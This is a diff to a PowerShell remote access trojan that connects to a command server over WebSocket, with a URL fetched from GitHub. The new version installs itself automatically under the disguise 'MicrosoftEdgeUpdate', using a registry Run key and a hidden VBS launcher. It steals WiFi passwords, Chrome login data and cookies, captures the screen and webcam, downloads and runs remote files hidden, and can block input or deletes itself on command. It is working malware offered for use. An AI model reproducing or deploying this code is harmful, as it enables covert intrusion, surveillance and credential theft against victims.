@@ -1,11 +1,12 @@
 # RAT WebSocket Client - Full Featured Stealth Edition
-# Invisible execution, auto-persistence, multi-client support
+# Auto-persistence enabled by default
 
-$wssUrlFile = "https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/url"
-$botPrefix = "/"
-$persistEnabled = $false
+# Force run as hidden job if not already
+$myPID = $PID
+$runningJobs = Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like "*EdgeUpdate*updater.ps1*" -and $_.ProcessId -ne $myPID }
+if ($runningJobs.Count -gt 1) { exit }
 
-# Hide PowerShell window
+# Hide all windows
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
@@ -21,20 +22,83 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.Speech
 
-# Generate UID
-$global:uid = "$env:COMPUTERNAME-$env:USERNAME"
+# Mouse/Keyboard control
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class InputControl {
+    [DllImport("user32.dll")]
+    public static extern bool ShowCursor(bool bShow);
+    
+    [DllImport("user32.dll")]
+    public static extern bool BlockInput(bool fBlockIt);
+    
+    [DllImport("user32.dll")]
+    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
+    
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetForegroundWindow();
+    
+    [DllImport("user32.dll")]
+    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
+    
+    public const int KEYEVENTF_KEYDOWN = 0x0;
+    public const int KEYEVENTF_KEYUP = 0x2;
+}
+"@ -ErrorAction SilentlyContinue
 
-# Get WSS URL from GitHub
-function Get-WssUrl {
+$global:uid = "$env:COMPUTERNAME-$env:USERNAME"
+$wssUrlFile = "https://raw.githubusercontent.com/icyyboy/wss-test-/refs/heads/main/url"
+$botPrefix = "/"
+$persistEnabled = $false
+
+# Auto-enable persistence on first run
+function Initialize-Persistence {
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $regName = "MicrosoftEdgeUpdate"
+    
     try {
-        $url = (Invoke-WebRequest -Uri $wssUrlFile -UseBasicParsing -TimeoutSec 10).Content.Trim()
-        return $url
+        $existing = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
+        
+        if (-not $existing) {
+            # First run - enable persistence automatically
+            $targetDir = "$env:APPDATA\Microsoft\EdgeUpdate"
+            
+            if (-not (Test-Path $targetDir)) {
+                New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
+                attrib +h $targetDir
+            }
+            
+            $scriptPath = "$targetDir\updater.ps1"
+            
+            # Copy self to persistent location if not already there
+            if ($PSCommandPath -ne $scriptPath) {
+                Copy-Item $PSCommandPath $scriptPath -Force
+            }
+            
+            # Create VBS launcher
+            $vbsPath = "$targetDir\launcher.vbs"
+            $vbsContent = @"
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File ""$scriptPath""", 0, False
+"@
+            Set-Content -Path $vbsPath -Value $vbsContent -Force
+            
+            # Add to startup
+            $regValue = "wscript.exe `"$vbsPath`" //B //Nologo"
+            Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
+            
+            $global:persistEnabled = $true
+            return $true
+        } else {
+            $global:persistEnabled = $true
+            return $false
+        }
     } catch {
-        return "wss://idk--sjeje2553.replit.app"
+        return $false
     }
 }
 
-# Check persistence
 function Check-Persistence {
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $regName = "MicrosoftEdgeUpdate"
@@ -56,29 +120,35 @@ function Set-Persistence {
         $targetDir = "$env:APPDATA\Microsoft\EdgeUpdate"
         if (-not (Test-Path $targetDir)) {
             New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
+            attrib +h $targetDir
         }
         
-        $scriptPath = $PSCommandPath
-        $targetScript = "$targetDir\updater.ps1"
-        $targetBat = "$targetDir\launcher.bat"
+        $scriptPath = "$targetDir\updater.ps1"
         
-        Copy-Item $scriptPath $targetScript -Force
+        # Copy self to persistent location
+        if ($PSCommandPath -ne $scriptPath) {
+            Copy-Item $PSCommandPath $scriptPath -Force
+        }
         
-        $batContent = @"
-@echo off
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File "%~dp0updater.ps1"
+        # Create VBS launcher (no console window)
+        $vbsPath = "$targetDir\launcher.vbs"
+        $vbsContent = @"
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File ""$scriptPath""", 0, False
 "@
-        Set-Content -Path $targetBat -Value $batContent -Force
+        Set-Content -Path $vbsPath -Value $vbsContent -Force
         
-        $regValue = "cmd.exe /c start /min `"`" `"$targetBat`""
+        # Add VBS to startup
+        $regValue = "wscript.exe `"$vbsPath`" //B //Nologo"
         Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
         
         $global:persistEnabled = $true
-        return "Persistence enabled"
+        return "Persistence enabled (startup auto-run activated)"
     } else {
+        # Remove from startup
         Remove-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
         $global:persistEnabled = $false
-        return "Persistence disabled"
+        return "Persistence disabled (will NOT run on startup)"
     }
 }
 
@@ -105,7 +175,7 @@ CPU: $cpu
 RAM: ${ram}GB
 GPU: $gpu
 Disk C: $($disk.FreeGB)GB free / $($disk.SizeGB)GB total
-Persistence: $persistEnabled
+Persistence: $persistEnabled (Auto-startup)
 "@
 }
 
@@ -189,7 +259,6 @@ function Capture-Webcam {
     }
 }
 
-# WiFi passwords
 function Get-WiFiPasswords {
     try {
         $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[-1].Trim() }
@@ -214,7 +283,6 @@ function Get-WiFiPasswords {
     }
 }
 
-# Chrome passwords
 function Get-ChromePasswords {
     try {
         $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
@@ -225,11 +293,9 @@ function Get-ChromePasswords {
         $tempDb = "$env:TEMP\ld_$(Get-Random).db"
         Copy-Item $chromePath $tempDb -Force -ErrorAction Stop
         
-        # Read SQLite database manually (no external dependencies)
         $bytes = [System.IO.File]::ReadAllBytes($tempDb)
         $text = [System.Text.Encoding]::ASCII.GetString($bytes)
         
-        # Extract URLs (simple pattern matching)
         $urls = [regex]::Matches($text, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}') | ForEach-Object { $_.Value } | Select-Object -Unique
         
         Remove-Item $tempDb -Force
@@ -246,14 +312,11 @@ function Get-ChromePasswords {
     }
 }
 
-# Chrome cookies
 function Get-ChromeCookies {
     try {
         $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
         
-        # Try new path first
         if (-not (Test-Path $cookiesPath)) {
-            # Fallback to old path
             $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
         }
         
@@ -275,7 +338,45 @@ function Get-ChromeCookies {
     }
 }
 
-# Volume control - FIXED VERSION
+function Get-NetworkInfo {
+    try {
+        $result = "Network Information:`n`n"
+        
+        $adapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }
+        foreach ($adapter in $adapters) {
+            $config = Get-NetIPAddress -InterfaceIndex $adapter.ifIndex -ErrorAction SilentlyContinue
+            $result += "Adapter: $($adapter.Name)`n"
+            $result += "  MAC: $($adapter.MacAddress)`n"
+            foreach ($ip in $config) {
+                $result += "  IP: $($ip.IPAddress)`n"
+            }
+            $result += "`n"
+        }
+        
+        return $result
+    } catch {
+        return "Network info failed: $($_.Exception.Message)"
+    }
+}
+
+function Get-OpenPorts {
+    try {
+        $connections = netstat -ano | Select-String "LISTENING"
+        return "Open Ports:`n`n$connections"
+    } catch {
+        return "Failed to get ports: $($_.Exception.Message)"
+    }
+}
+
+function Get-ArpTable {
+    try {
+        $arp = arp -a
+        return "ARP Table:`n`n$arp"
+    } catch {
+        return "Failed to get ARP: $($_.Exception.Message)"
+    }
+}
+
 function Set-SystemVolume {
     param([int]$percent)
     
@@ -283,23 +384,20 @@ function Set-SystemVolume {
         if ($percent -lt 0) { $percent = 0 }
         if ($percent -gt 100) { $percent = 100 }
         
-        # First mute to reset
         $obj = New-Object -ComObject wscript.shell
-        $obj.SendKeys([char]173) # Mute
+        $obj.SendKeys([char]173)
         Start-Sleep -Milliseconds 100
-        $obj.SendKeys([char]173) # Unmute
+        $obj.SendKeys([char]173)
         Start-Sleep -Milliseconds 100
         
-        # Set to 0
         for ($i = 0; $i -lt 50; $i++) {
-            $obj.SendKeys([char]174) # Volume down
+            $obj.SendKeys([char]174)
         }
         Start-Sleep -Milliseconds 200
         
-        # Set to desired level (each tick = 2%)
         $ticks = [math]::Round($percent / 2)
         for ($i = 0; $i -lt $ticks; $i++) {
-            $obj.SendKeys([char]175) # Volume up
+            $obj.SendKeys([char]175)
         }
         
         return "Volume set to $percent%"
@@ -310,14 +408,13 @@ function Set-SystemVolume {
 
 function Get-SystemVolume {
     try {
-        # Use WMI to get approximate volume
         Add-Type -TypeDefinition @"
 using System.Runtime.InteropServices;
 public class VolGet {
     [DllImport("winmm.dll")]
     public static extern int waveOutGetVolume(int hwo, out uint dwVolume);
 }
-"@
+"@ -ErrorAction SilentlyContinue
         [uint32]$vol = 0
         [VolGet]::waveOutGetVolume(0, [ref]$vol)
         $percent = [math]::Round((($vol -band 0xFFFF) / 0xFFFF) * 100)
@@ -327,7 +424,6 @@ public class VolGet {
     }
 }
 
-# Text-to-Speech
 function Invoke-TTS {
     param([string]$text)
     
@@ -343,7 +439,6 @@ function Invoke-TTS {
     }
 }
 
-# Play audio file
 function Play-AudioFile {
     param([string]$url)
     
@@ -361,13 +456,247 @@ function Play-AudioFile {
         
         Start-Sleep -Seconds 2
         
-        return "Audio playing in background: $tempFile"
+        return "Audio playing in background"
     } catch {
         return "Audio playback failed: $($_.Exception.Message)"
     }
 }
 
-# Lock workstation
+function Show-MessageBox {
+    param([string]$text)
+    
+    try {
+        [System.Windows.Forms.MessageBox]::Show($text, "System Message", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
+        return "Message box shown: $text"
+    } catch {
+        return "Message box failed: $($_.Exception.Message)"
+    }
+}
+
+function Set-MouseVisibility {
+    param([bool]$visible)
+    
+    try {
+        [InputControl]::ShowCursor($visible)
+        $status = if ($visible) { "visible" } else { "hidden" }
+        return "Mouse cursor $status"
+    } catch {
+        return "Failed to change mouse visibility: $($_.Exception.Message)"
+    }
+}
+
+function Invoke-SystemShutdown {
+    param([string]$action, [int]$seconds = 30)
+    
+    try {
+        switch ($action) {
+            "shutdown" {
+                shutdown /s /t $seconds /c "System maintenance"
+                return "Shutdown scheduled in $seconds seconds"
+            }
+            "restart" {
+                shutdown /r /t $seconds /c "System restart"
+                return "Restart scheduled in $seconds seconds"
+            }
+            "cancel" {
+                shutdown /a
+                return "Shutdown/restart cancelled"
+            }
+            default {
+                return "Usage: /shutdown shutdown/restart/cancel [seconds]"
+            }
+        }
+    } catch {
+        return "Shutdown failed: $($_.Exception.Message)"
+    }
+}
+
+function Invoke-FlipScreen {
+    try {
+        $obj = New-Object -ComObject wscript.shell
+        $obj.SendKeys("^%{DOWN}")
+        return "Screen flipped"
+    } catch {
+        return "Screen flip failed: $($_.Exception.Message)"
+    }
+}
+
+function Invoke-ShakeWindows {
+    try {
+        $hwnd = [InputControl]::GetForegroundWindow()
+        
+        for ($i = 0; $i -lt 20; $i++) {
+            $x = Get-Random -Minimum -10 -Maximum 10
+            $y = Get-Random -Minimum -10 -Maximum 10
+            [InputControl]::SetWindowPos($hwnd, [IntPtr]::Zero, $x, $y, 0, 0, 0x0001 -bor 0x0004)
+            Start-Sleep -Milliseconds 50
+        }
+        
+        return "Window shaken"
+    } catch {
+        return "Shake failed: $($_.Exception.Message)"
+    }
+}
+
+function Invoke-GlitchEffect {
+    try {
+        $obj = New-Object -ComObject wscript.shell
+        
+        for ($i = 0; $i -lt 10; $i++) {
+            $obj.SendKeys("^%{UP}")
+            Start-Sleep -Milliseconds 100
+            $obj.SendKeys("^%{DOWN}")
+            Start-Sleep -Milliseconds 100
+            $obj.SendKeys("^%{LEFT}")
+            Start-Sleep -Milliseconds 100
+            $obj.SendKeys("^%{RIGHT}")
+            Start-Sleep -Milliseconds 100
+        }
+        
+        $obj.SendKeys("^%{UP}")
+        
+        return "Glitch effect executed"
+    } catch {
+        return "Glitch failed: $($_.Exception.Message)"
+    }
+}
+
+function Invoke-SwapKeys {
+    param([string]$duration = "30")
+    
+    try {
+        $script = {
+            param($seconds)
+            Add-Type -AssemblyName System.Windows.Forms
+            
+            $endTime = (Get-Date).AddSeconds($seconds)
+            
+            while ((Get-Date) -lt $endTime) {
+                if ([System.Windows.Forms.Control]::IsKeyLocked([System.Windows.Forms.Keys]::CapsLock)) {
+                    [System.Windows.Forms.SendKeys]::SendWait("{CAPSLOCK}")
+                }
+                Start-Sleep -Milliseconds 100
+            }
+        }
+        
+        Start-Job -ScriptBlock $script -ArgumentList ([int]$duration) | Out-Null
+        
+        return "Keys swapped for $duration seconds"
+    } catch {
+        return "Key swap failed: $($_.Exception.Message)"
+    }
+}
+
+function Invoke-DisableKeyboard {
+    param([int]$seconds = 10)
+    
+    try {
+        [InputControl]::BlockInput($true)
+        Start-Sleep -Seconds $seconds
+        [InputControl]::BlockInput($false)
+        
+        return "Keyboard blocked for $seconds seconds"
+    } catch {
+        return "Keyboard block failed: $($_.Exception.Message)"
+    }
+}
+
+function Invoke-SpamText {
+    param([string]$text, [int]$count = 50)
+    
+    try {
+        $obj = New-Object -ComObject wscript.shell
+        Start-Sleep -Seconds 2
+        
+        for ($i = 0; $i -lt $count; $i++) {
+            $obj.SendKeys($text)
+            $obj.SendKeys("{ENTER}")
+            Start-Sleep -Milliseconds 100
+        }
+        
+        return "Spammed text $count times"
+    } catch {
+        return "Text spam failed: $($_.Exception.Message)"
+    }
+}
+
+function Show-ToastNotification {
+    param([string]$title, [string]$message)
+    
+    try {
+        [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
+        [Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null
+        
+        $template = @"
+<toast>
+    <visual>
+        <binding template="ToastGeneric">
+            <text>$title</text>
+            <text>$message</text>
+        </binding>
+    </visual>
+</toast>
+"@
+        
+        $xml = New-Object Windows.Data.Xml.Dom.XmlDocument
+        $xml.LoadXml($template)
+        
+        $toast = New-Object Windows.UI.Notifications.ToastNotification($xml)
+        [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("PowerShell").Show($toast)
+        
+        return "Toast notification sent: $title - $message"
+    } catch {
+        return "Toast failed: $($_.Exception.Message)"
+    }
+}
+
+function Invoke-SpamNotifications {
+    param([int]$count = 20)
+    
+    try {
+        for ($i = 1; $i -le $count; $i++) {
+            Show-ToastNotification -title "Notification #$i" -message "This is notification number $i" | Out-Null
+            Start-Sleep -Milliseconds 500
+        }
+        
+        return "Spammed $count notifications"
+    } catch {
+        return "Notification spam failed: $($_.Exception.Message)"
+    }
+}
+
+function Invoke-DownloadAndExecute {
+    param([string]$url, [string]$args = "")
+    
+    try {
+        $ext = [System.IO.Path]::GetExtension($url)
+        if (-not $ext) { $ext = ".exe" }
+        
+        $tempFile = "$env:TEMP\dl_$(Get-Random)$ext"
+        Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
+        
+        if ($args) {
+            Start-Process -FilePath $tempFile -ArgumentList $args -WindowStyle Hidden
+            return "Downloaded and executed: $tempFile $args"
+        } else {
+            Start-Process -FilePath $tempFile -WindowStyle Hidden
+            return "Downloaded and executed: $tempFile"
+        }
+    } catch {
+        return "Download/Execute failed: $($_.Exception.Message)"
+    }
+}
+
+function Invoke-HideWindow {
+    try {
+        $hwnd = [InputControl]::GetForegroundWindow()
+        [Console.Window]::ShowWindow($hwnd, 0)
+        return "Active window hidden"
+    } catch {
+        return "Hide window failed: $($_.Exception.Message)"
+    }
+}
+
 function Invoke-Logout {
     try {
         rundll32.exe user32.dll,LockWorkStation
@@ -377,7 +706,6 @@ function Invoke-Logout {
     }
 }
 
-# Kill explorer.exe
 function Invoke-KillExplorer {
     try {
         Stop-Process -Name explorer -Force
@@ -387,24 +715,28 @@ function Invoke-KillExplorer {
     }
 }
 
-# Self delete
 function Remove-SelfDelete {
     try {
         $scriptPath = $PSCommandPath
+        $targetDir = "$env:APPDATA\Microsoft\EdgeUpdate"
         
-        $batContent = @"
-@echo off
-timeout /t 2 /nobreak >nul
-del /f /q "$scriptPath"
-del /f /q "%~f0"
+        $vbsContent = @"
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+WScript.Sleep 2000
+On Error Resume Next
+objFSO.DeleteFile "$scriptPath", True
+objFSO.DeleteFile "$targetDir\updater.ps1", True
+objFSO.DeleteFile "$targetDir\launcher.vbs", True
+objFSO.DeleteFolder "$targetDir", True
+objFSO.DeleteFile WScript.ScriptFullName, True
 "@
         
-        $batPath = "$env:TEMP\cleanup_$(Get-Random).bat"
-        Set-Content $batPath $batContent
+        $vbsPath = "$env:TEMP\cleanup_$(Get-Random).vbs"
+        Set-Content $vbsPath $vbsContent
         
-        Start-Process -FilePath $batPath -WindowStyle Hidden
+        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`" //B //Nologo" -WindowStyle Hidden
         
-        return "Self-destruct initiated"
+        return "Self-destruct initiated (removed from startup)"
         Start-Sleep -Seconds 1
         exit
     } catch {
@@ -415,7 +747,6 @@ del /f /q "%~f0"
 function Process-Command {
     param([string]$message)
     
-    # Check if message is targeted
     if ($message.StartsWith("#")) {
         $parts = $message.Substring(1) -split ' ', 2
         $targetUid = $parts[0]
@@ -432,150 +763,151 @@ function Process-Command {
     
     if (-not $message.StartsWith($botPrefix)) { return $null }
     
-    $parts = $message.Substring(1) -split ' ', 2
+    $parts = $message.Substring(1) -split ' '
     $cmd = $parts[0].ToLower()
-    $args = if ($parts.Length -gt 1) { $parts[1] } else { "" }
+    $args = $parts[1..($parts.Length-1)]
     
     switch ($cmd) {
-        "info" {
-            return Get-SystemInfo
-        }
+        "info" { return Get-SystemInfo }
         "exec" {
-            if ($args) {
-                return Execute-Command -cmd $args
+            if ($args.Count -gt 0) {
+                return Execute-Command -cmd ($args -join ' ')
             }
             return "Usage: /exec <command>"
         }
         "download" {
-            $params = $args -split ' ', 2
-            if ($params.Length -eq 2) {
-                return Download-File -url $params[0] -path $params[1]
+            if ($args.Count -ge 2) {
+                return Download-File -url $args[0] -path ($args[1..($args.Count-1)] -join ' ')
             }
             return "Usage: /download <url> <path>"
         }
         "upload" {
-            if ($args) {
-                return Upload-File -filePath $args
+            if ($args.Count -gt 0) {
+                return Upload-File -filePath ($args -join ' ')
             }
             return "Usage: /upload <filepath>"
         }
-        "ss" {
-            return Take-Screenshot
-        }
-        "webcam" {
-            return Capture-Webcam
-        }
-        "wifi" {
-            return Get-WiFiPasswords
-        }
-        "passwords" {
-            return Get-ChromePasswords
-        }
-        "cookies" {
-            return Get-ChromeCookies
-        }
+        "ss" { return Take-Screenshot }
+        "webcam" { return Capture-Webcam }
+        "wifi" { return Get-WiFiPasswords }
+        "passwords" { return Get-ChromePasswords }
+        "cookies" { return Get-ChromeCookies }
+        "netinfo" { return Get-NetworkInfo }
+        "ports" { return Get-OpenPorts }
+        "arp" { return Get-ArpTable }
         "volume" {
-            if ($args -match '^\d+$') {
-                return Set-SystemVolume -percent ([int]$args)
-            } elseif ($args -eq "get") {
+            if ($args.Count -gt 0 -and $args[0] -match '^\d+$') {
+                return Set-SystemVolume -percent ([int]$args[0])
+            } elseif ($args.Count -gt 0 -and $args[0] -eq "get") {
                 return Get-SystemVolume
             }
             return "Usage: /volume <0-100> or /volume get"
         }
         "tts" {
-            if ($args) {
-                return Invoke-TTS -text $args
+            if ($args.Count -gt 0) {
+                return Invoke-TTS -text ($args -join ' ')
             }
             return "Usage: /tts <text>"
         }
         "play" {
-            if ($args) {
-                return Play-AudioFile -url $args
+            if ($args.Count -gt 0) {
+                return Play-AudioFile -url $args[0]
             }
             return "Usage: /play <audio_url>"
         }
-        "logout" {
-            return Invoke-Logout
+        "msg" {
+            if ($args.Count -gt 0) {
+                return Show-MessageBox -text ($args -join ' ')
+            }
+            return "Usage: /msg <text>"
         }
-        "killsis" {
-            return Invoke-KillExplorer
+        "hidemouse" { return Set-MouseVisibility -visible $false }
+        "showmouse" { return Set-MouseVisibility -visible $true }
+        "shutdown" {
+            if ($args.Count -gt 0) {
+                $sec = if ($args.Count -gt 1) { [int]$args[1] } else { 30 }
+                return Invoke-SystemShutdown -action $args[0] -seconds $sec
+            }
+            return "Usage: /shutdown shutdown/restart/cancel [seconds]"
         }
-        "selfdestruct" {
-            return Remove-SelfDelete
+        "flip" { return Invoke-FlipScreen }
+        "shake" { return Invoke-ShakeWindows }
+        "glitch" { return Invoke-GlitchEffect }
+        "swapkeys" {
+            $dur = if ($args.Count -gt 0) { $args[0] } else { "30" }
+            return Invoke-SwapKeys -duration $dur
         }
+        "disablekb" {
+            $sec = if ($args.Count -gt 0) { [int]$args[0] } else { 10 }
+            return Invoke-DisableKeyboard -seconds $sec
+        }
+        "spam" {
+            if ($args.Count -gt 0) {
+                $cnt = if ($args.Count -gt 1 -and $args[-1] -match '^\d+$') { [int]$args[-1]; $args = $args[0..($args.Count-2)] } else { 50 }
+                return Invoke-SpamText -text ($args -join ' ') -count $cnt
+            }
+            return "Usage: /spam <text> [count]"
+        }
+        "toast" {
+            if ($args.Count -ge 2) {
+                return Show-ToastNotification -title $args[0] -message ($args[1..($args.Count-1)] -join ' ')
+            }
+            return "Usage: /toast <title> <message>"
+        }
+        "notifyspam" {
+            $cnt = if ($args.Count -gt 0) { [int]$args[0] } else { 20 }
+            return Invoke-SpamNotifications -count $cnt
+        }
+        "dlexec" {
+            if ($args.Count -gt 0) {
+                return Invoke-DownloadAndExecute -url $args[0]
+            }
+            return "Usage: /dlexec <url>"
+        }
+        "dlrun" {
+            if ($args.Count -ge 2) {
+                return Invoke-DownloadAndExecute -url $args[0] -args ($args[1..($args.Count-1)] -join ' ')
+            }
+            return "Usage: /dlrun <url> <args>"
+        }
+        "hide" { return Invoke-HideWindow }
+        "logout" { return Invoke-Logout }
+        "killsis" { return Invoke-KillExplorer }
+        "selfdestruct" { return Remove-SelfDelete }
         "persist" {
-            if ($args -eq "on") {
+            if ($args.Count -gt 0 -and $args[0] -eq "on") {
                 return Set-Persistence -enable $true
-            } elseif ($args -eq "off") {
+            } elseif ($args.Count -gt 0 -and $args[0] -eq "off") {
                 return Set-Persistence -enable $false
             } else {
-                $status = if ($persistEnabled) { "ON" } else { "OFF" }
+                $status = if ($persistEnabled) { "ENABLED (auto-startup)" } else { "DISABLED" }
                 return "Persistence: $status | Usage: /persist on/off"
             }
         }
-        "processes" {
-            return (Get-Process | Select-Object -First 30 Id, ProcessName, CPU | Format-Table | Out-String)
-        }
+        "processes" { return (Get-Process | Select-Object -First 30 Id, ProcessName, CPU | Format-Table | Out-String) }
         "kill" {
-            if ($args) {
+            if ($args.Count -gt 0) {
                 try {
-                    Stop-Process -Id $args -Force
-                    return "Process $args killed"
+                    Stop-Process -Id $args[0] -Force
+                    return "Process $($args[0]) killed"
                 } catch {
                     return "Failed: $($_.Exception.Message)"
                 }
             }
             return "Usage: /kill <pid>"
         }
-        "exit" {
-            return "EXIT_SIGNAL"
-        }
+        "exit" { return "EXIT_SIGNAL" }
         "help" {
             return @"
-Commands (prefix: / or #UID):
-System:                            
-/info - Full system info           
-/exec <cmd> - Execute PowerShell   
-/processes - List processes        
-/kill <pid> - Kill process         
-/killsis - Kill explorer.exe       
-/persist on/off -Toggle persistence
-/logout - Lock workstation         
-/selfdestruct - Delete itself, exit
-                                   
-Surveillance:                      
-/ss - Screenshot (PNG base64)      
-/webcam - Webcam capture           
-                                   
-Data Extraction:                   
-/wifi - WiFi passwords             
-/passwords - Chrome saved URLs     
-/cookies - Chrome cookies (base64) 
-                                    
-Audio/Sound:                       
-/volume <0-100> - Set volume       
-/volume get - Get current volume    
-/tts <text> - Text-to-speech        
-/play <url> - Play audio file       
-                                    
-File Operations:                    
-/download <url> <path>              
-/upload <path>                      
-                                    
-/exit - Disconnect                  
-                                     
-Targeting:                           
-#$global:uid /ss - Only this client  
-/ss - All clients (broadcast)        
+Commands: /info /exec /ss /webcam /wifi /passwords /cookies /netinfo /ports /arp /volume /tts /play /msg /hidemouse /showmouse /shutdown /flip /shake /glitch /swapkeys /disablekb /spam /toast /notifyspam /dlexec /dlrun /hide /logout /killsis /persist /processes /kill /selfdestruct /exit
 "@
         }
-        default {
-            return "Unknown command. Use /help"
-        }
+        default { return "Unknown: /help" }
     }
 }
 
-# Initialize
+# Initialize - auto-enable persistence on first run
+$wasFirstRun = Initialize-Persistence
 $persistEnabled = Check-Persistence
 
 # Main loop
@@ -600,7 +932,8 @@ while ($true) {
                 $publicIP = "Unknown"
             }
             
-            $initMsg = "UID:$global:uid CONNECTED | IP: $publicIP | Persist: $persistEnabled"
+            $autoStartMsg = if ($wasFirstRun) { " | AUTO-PERSISTENCE ENABLED" } else { "" }
+            $initMsg = "UID:$global:uid CONNECTED | IP: $publicIP | Persist: $persistEnabled$autoStartMsg"
             $initBytes = [System.Text.Encoding]::UTF8.GetBytes($initMsg)
             $sendTask = $ws.SendAsync([System.ArraySegment[byte]]::new($initBytes), 'Text', $true, $ct)
             $sendTask.Wait()
@@ -640,9 +973,7 @@ while ($true) {
         
         $ws.Dispose()
         
-    } catch {
-        # Silent fail
-    }
+    } catch {}
     
     Start-Sleep -Seconds 20
 }
